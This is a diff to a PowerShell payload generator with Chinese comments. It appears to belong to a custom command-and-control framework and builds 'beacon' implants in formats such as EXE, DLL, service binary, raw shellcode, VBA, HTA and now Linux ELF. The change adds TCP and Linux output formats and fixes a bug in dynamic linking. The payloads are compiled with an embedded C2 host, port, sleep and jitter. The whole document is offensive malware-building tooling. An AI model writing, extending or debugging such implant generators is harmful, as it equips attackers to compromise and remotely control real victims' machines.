@@ -1,4 +1,4 @@
-# cs_dev :: gen_payload2.ps1  --  协议 v2 Payload 生成器 (多格式)
+﻿# cs_dev :: gen_payload2.ps1  --  协议 v2 Payload 生成器 (多格式)
 # ==========================================================================
 # v1 (tools\gen_payload.ps1) -> kits\beacon\win_beacon.c   密钥硬编码 / 明文命令
 # v2 (本脚本)              -> kits\beacon\beacon2.c      每会话 RSA-2048 交换密钥,
@@ -292,7 +292,9 @@ if (-not $Quiet) {
 # 默认输出路径 + 扩展名
 $ExtMap = @{
     'win2-exe'='.exe'; 'win2-console'='.exe'; 'win2-svc'='.exe'; 'win2-dll'='.dll'; 'win2-raw'='.bin'; 'win2-udrl'='.exe'
+    'win2-tcp'='.exe'
     'win2-ps1'='.ps1'; 'win2-vba'='.bas'; 'win2-vbs'='.vbs'; 'win2-cs'='.cs'; 'win2-hta'='.hta'
+    'linux2-elf'='.elf'; 'linux2-dyn'='.elf'
 }
 if (-not $OutFile) {
     $OutFile = Join-Path $BuildD ("payload2_{0}_{1}_{2}{3}" -f $Format, $Host_, $Port, $ExtMap[$Format])
@@ -577,7 +579,9 @@ elseif ($Format -like 'linux2-*') {
     $outDir   = Split-Path -Parent $OutFile
     if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }
     $wslOut   = '/mnt/' + $OutFile.Substring(0,1).ToLower() + ($OutFile.Substring(2) -replace '\\','/')
-    $dl       = if ($Dynamic) { '' } else { '-static' }
+    # 修正: 原代码引用未定义的 $Dynamic, 恒为 false -> linux2-dyn 永远打成静态链接。
+    # 应按格式决定: 只有 linux2-dyn 去 -static, 其余 (linux2-elf) 保持静态。
+    $dl       = if ($Format -eq 'linux2-dyn') { '' } else { '-static' }
 
     $srcs = "beacon2_linux.c rsa_linux.c ../kits/proto/frame.c ../kits/crypto/aes.c ../kits/crypto/sha256.c"
     $flags = "-O2 -s $dl -DC2_HOST='`"$Host_`"' -DC2_PORT=$Port -DC2_SLEEP=$($Sleep)u -DC2_JITTER=$Jitter"
